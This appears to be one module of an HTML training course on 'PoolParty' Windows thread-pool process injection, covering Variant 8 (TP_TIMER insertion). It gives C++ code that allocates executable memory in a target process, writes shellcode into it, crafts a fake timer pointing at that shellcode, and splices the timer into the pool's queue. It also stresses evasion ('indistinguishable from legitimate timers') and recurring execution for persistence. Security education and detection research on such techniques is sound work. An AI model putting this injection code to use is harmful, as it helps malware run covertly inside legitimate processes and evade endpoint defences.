@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: TP_TIMER Insertion - PoolParty Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F3CA;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f59e0b;--accent2:#d97706;--gradient:linear-gradient(135deg,#f59e0b,#d97706)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>PoolParty Course</h2>
+<span>Thread Pool Injection Masterclass</span>
+</div>
+<a class="home-link" href="../PoolParty_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Process Injection Landscape</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Thread Pool Architecture</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Thread Pool Internals</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. Worker Factory &amp; TP_WORK</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. Wait, I/O &amp; ALPC</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Job &amp; Direct Variants</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module7.html"><span>7. TP_TIMER Insertion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: TP_TIMER Insertion</h1>
+<p class="subtitle">PoolParty Variant 8: Inserting a crafted TP_TIMER item into the target pool&rsquo;s timer queue, arming it with TpSetTimer, and triggering shellcode execution on timer expiry.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how PoolParty Variant 8 injects a crafted TP_TIMER structure into the target process, arms it with an immediate due time, and leverages the thread pool&rsquo;s internal timer subsystem to dispatch the callback through the IOCP to a worker thread. This variant demonstrates that even time-based dispatch mechanisms can be abused for injection.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Timer-Based Thread Pool Callbacks</h2>
+
+<p>The Windows thread pool supports timer callbacks: a function is called when a specified time elapses. Internally, the timer subsystem uses a dedicated timer thread (<code>TppTimerpExecuteCallbacks</code>) that manages an ordered list of <code>TP_TIMER</code> structures and posts completion packets to the pool&rsquo;s IOCP when timers expire.</p>
+
+<div class="diagram">
+<h4>Normal Timer Flow</h4>
+<div class="flow">
+<div class="flow box">TpAllocTimer<br><small>Create TP_TIMER</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">TpSetTimer<br><small>Arm with due time</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box y">Timer expires<br><small>TppTimerThread fires</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Post to IOCP<br><small>Completion packet</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Callback runs<br><small>Worker thread</small></div>
+</div>
+</div>
+
+<h3>1.1 TP_TIMER Internals</h3>
+
+<pre><span class="lang-tag">C++ (Reconstructed)</span><code>// TP_TIMER structure (simplified, reverse-engineered)
+struct TP_TIMER {
+    // Inherited from TP_TASK base
+    TP_TASK             Task;           // Callback function + context
+    PTP_POOL            Pool;           // Owning pool
+
+    // Timer-specific fields
+    LIST_ENTRY          WindowEntry;    // Position in timer window list
+    LIST_ENTRY          ExpirationEntry;// Position in expiration queue
+    LARGE_INTEGER       DueTime;        // Absolute time for first fire
+    ULONG               Period;         // Recurring interval in ms (0=one-shot)
+    ULONG               Window;         // Coalescing window in ms
+    BOOLEAN             IsSet;          // Whether the timer is armed
+    ULONG               Flags;
+};</code></pre>
+
+<p>The timer thread maintains a sorted list of pending timers. When the current time passes a timer&rsquo;s <code>DueTime</code>, the timer thread removes it from the expiration queue and posts its callback to the IOCP for a worker thread to execute.</p>
+
+<!-- ============================================================ -->
+<h2>2. Variant 8: TP_TIMER Insertion</h2>
+
+<p>Variant 8 crafts a complete <code>TP_TIMER</code> structure in the target process, inserts it into the timer queue, and arms it with an immediate due time. When the timer &ldquo;expires&rdquo; (immediately), the timer thread dispatches the callback through the IOCP to a worker thread.</p>
+
+<div class="diagram">
+<h4>Variant 8 Attack Flow</h4>
+<div class="flow">
+<div class="flow box">Allocate shellcode<br><small>VirtualAllocEx</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Craft TP_TIMER<br><small>Callback = shellcode</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box hl">Arm timer<br><small>DueTime = now</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box g">Shellcode fires<br><small>Via worker thread</small></div>
+</div>
+</div>
+
+<h3>2.1 Implementation</h3>
+
+<pre><span class="lang-tag">C++</span><code>// Variant 8: TP_TIMER Insertion
+
+// Step 1: Allocate and write shellcode in target process
+LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL,
+    shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(hProcess, remoteShellcode, shellcode,
+                   shellcodeSize, NULL);
+
+// Step 2: Craft a TP_TIMER structure
+// The callback points to our shellcode
+TP_TIMER fakeTimer = { 0 };
+fakeTimer.Task.WorkCallback = (PTP_WORK_CALLBACK)remoteShellcode;
+fakeTimer.Task.Context = NULL;
+fakeTimer.Pool = (PTP_POOL)targetPoolPtr;
+
+// Set DueTime to fire immediately (negative = relative, 0 = now)
+fakeTimer.DueTime.QuadPart = 0;
+fakeTimer.Period = 0;        // One-shot
+fakeTimer.Window = 0;
+fakeTimer.IsSet = TRUE;
+
+// Step 3: Write the fake timer into target process memory
+LPVOID remoteTimer = VirtualAllocEx(hProcess, NULL,
+    sizeof(TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, remoteTimer, &fakeTimer,
+                   sizeof(TP_TIMER), NULL);
+
+// Step 4: Insert into the target pool's timer queue
+// Read the TP_POOL timer list head
+// Modify LIST_ENTRY pointers to include our fake timer
+InsertTimerIntoTargetQueue(hProcess, targetPoolPtr, remoteTimer);
+
+// Step 5: Signal the timer thread to process the queue
+// The TpSetTimer equivalent triggers re-evaluation of the
+// timer list, causing our immediate-due timer to fire
+TriggerTimerReEvaluation(hProcess, targetPoolPtr);</code></pre>
+
+<h3>2.2 Timer Queue Manipulation</h3>
+
+<p>Inserting into the timer queue requires careful linked list manipulation in the target process&rsquo;s memory:</p>
+
+<pre><span class="lang-tag">C++</span><code>// Insert our timer at the head of the expiration list
+// This ensures it's the next timer to be processed
+
+// Read current list head
+LIST_ENTRY timerListHead;
+PVOID headAddr = &((PTP_POOL)targetPoolPtr)->TimerExpiration.ListHead;
+ReadProcessMemory(hProcess, headAddr, &timerListHead,
+                  sizeof(LIST_ENTRY), NULL);
+
+// Point our timer's Flink to current first entry
+PVOID entryFlink = &((PTP_TIMER)remoteTimer)->ExpirationEntry.Flink;
+WriteProcessMemory(hProcess, entryFlink,
+                   &timerListHead.Flink, sizeof(PVOID), NULL);
+
+// Point our timer's Blink to the list head
+PVOID entryBlink = &((PTP_TIMER)remoteTimer)->ExpirationEntry.Blink;
+WriteProcessMemory(hProcess, entryBlink, &headAddr, sizeof(PVOID), NULL);
+
+// Update the previous first entry's Blink to point to our timer
+PVOID prevFirstBlink = (PBYTE)timerListHead.Flink +
+                       offsetof(LIST_ENTRY, Blink);
+WriteProcessMemory(hProcess, prevFirstBlink,
+                   &remoteTimer, sizeof(PVOID), NULL);
+
+// Update list head's Flink to point to our timer
+WriteProcessMemory(hProcess, headAddr,
+                   &remoteTimer, sizeof(PVOID), NULL);</code></pre>
+
+<div class="card warn">
+<h4>Timer Queue Stability Risks</h4>
+<p>Timer queue manipulation carries stability risks because the linked list pointers must be precisely correct. If offsets are wrong for the target&rsquo;s Windows version, corrupting the timer queue could cause the target process to crash. Unlike Variant 7 (TP_DIRECT), which avoids queue manipulation entirely, Variant 8 requires careful reverse engineering of the TP_POOL timer queue layout.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Why Timers Are Effective for Injection</h2>
+
+<p>Timer-based callbacks provide several advantages as injection vectors:</p>
+
+<div class="card green">
+<h4>Clean Execution Context</h4>
+<ul>
+<li><strong>Timers are ubiquitous</strong> &mdash; every non-trivial Windows application uses thread pool timers for periodic tasks, making timer activity normal</li>
+<li><strong>Attacker-controlled timing</strong> &mdash; by setting <code>DueTime</code>, the attacker controls exactly when the callback fires (immediately with <code>DueTime = 0</code>, or delayed)</li>
+<li><strong>Recurring capability</strong> &mdash; setting <code>Period &gt; 0</code> makes the callback fire repeatedly, enabling persistent execution</li>
+<li><strong>Dispatch path</strong> &mdash; the callback goes through <code>TppTimerpExecuteCallback</code>, a standard dispatch function indistinguishable from legitimate timers</li>
+</ul>
+</div>
+
+<p>The dispatch path for Variant 8 is: Timer thread &rarr; IOCP &rarr; Worker thread &rarr; <code>TppTimerpExecuteCallback</code> &rarr; shellcode. At every step, the execution looks like a normal timer callback.</p>
+
+<!-- ============================================================ -->
+<h2>4. Comparison With Other IOCP-Based Variants</h2>
+
+<table>
+<tr><th>Property</th><th>Variant 4 (TP_IO)</th><th>Variant 7 (TP_DIRECT)</th><th>Variant 8 (TP_TIMER)</th></tr>
+<tr><td><strong>Trigger mechanism</strong></td><td>Fake IOCP packet via NtSetIoCompletion</td><td>Direct IOCP packet via NtSetIoCompletionEx</td><td>Timer expiration (time-based)</td></tr>
+<tr><td><strong>Queue manipulation</strong></td><td>None &mdash; direct IOCP post</td><td>None &mdash; direct IOCP post</td><td>Required &mdash; timer list insertion</td></tr>
+<tr><td><strong>Structure complexity</strong></td><td>TP_IO with pending count</td><td>Minimal &mdash; function pointer only</td><td>TP_TIMER with due time, period, flags</td></tr>
+<tr><td><strong>Timing control</strong></td><td>Immediate</td><td>Immediate</td><td>Configurable (immediate or delayed)</td></tr>
+<tr><td><strong>Repeatability</strong></td><td>Post again to repeat</td><td>Post again to repeat</td><td>Set Period &gt; 0 for automatic recurring</td></tr>
+<tr><td><strong>Stability risk</strong></td><td>Low &mdash; no queue modification</td><td>Low &mdash; no queue modification</td><td>Higher &mdash; timer list corruption possible</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>5. Implementation Considerations</h2>
+
+<div class="card">
+<h4>Practical Notes</h4>
+<ul>
+<li><strong>Version-dependent offsets</strong> &mdash; the exact layout of TP_TIMER and the timer queue within TP_POOL varies between Windows builds. PoolParty uses pattern matching to find the correct offsets.</li>
+<li><strong>Timer thread notification</strong> &mdash; after inserting the timer, the timer thread must be notified to re-evaluate its wait time. This may involve signaling an internal event or modifying the timer thread&rsquo;s wait timeout.</li>
+<li><strong>DueTime format</strong> &mdash; Windows uses <code>LARGE_INTEGER</code> for timer due times. Negative values are relative (in 100-nanosecond intervals), positive values are absolute (since January 1, 1601). Setting <code>QuadPart = 0</code> triggers immediate expiration.</li>
+<li><strong>One-shot vs. recurring</strong> &mdash; a <code>Period</code> of 0 means one-shot execution. A positive value creates a recurring timer, useful for persistent injection (the shellcode runs periodically).</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: In Variant 8, what component actually posts the callback to the IOCP when the timer expires?</p>
+<div class="quiz-btn" data-choice="A">A) The attacker process</div>
+<div class="quiz-btn" data-choice="B">B) The thread pool's internal timer thread</div>
+<div class="quiz-btn" data-choice="C">C) The kernel timer interrupt handler</div>
+<div class="quiz-btn" data-choice="D">D) The target application's main thread</div>
+</div>
+
+<div class="quiz-q" data-answer="D">
+<p>Q2: What is the main disadvantage of Variant 8 (TP_TIMER) compared to Variant 7 (TP_DIRECT)?</p>
+<div class="quiz-btn" data-choice="A">A) TP_TIMER is more frequently monitored by EDRs</div>
+<div class="quiz-btn" data-choice="B">B) TP_TIMER requires administrator privileges</div>
+<div class="quiz-btn" data-choice="C">C) TP_TIMER cannot execute shellcode</div>
+<div class="quiz-btn" data-choice="D">D) TP_TIMER requires linked list manipulation in target memory, with version-dependent offsets and stability risks</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: How can Variant 8 achieve recurring shellcode execution?</p>
+<div class="quiz-btn" data-choice="A">A) By setting the TP_TIMER's Period field to a non-zero value</div>
+<div class="quiz-btn" data-choice="B">B) By calling CreateRemoteThread repeatedly</div>
+<div class="quiz-btn" data-choice="C">C) By inserting multiple TP_TIMER items</div>
+<div class="quiz-btn" data-choice="D">D) By modifying the worker factory StartRoutine</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Prev: Job &amp; Direct Variants</a>
+<a class="primary" href="module8.html">Next: Full Chain &amp; Detection &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
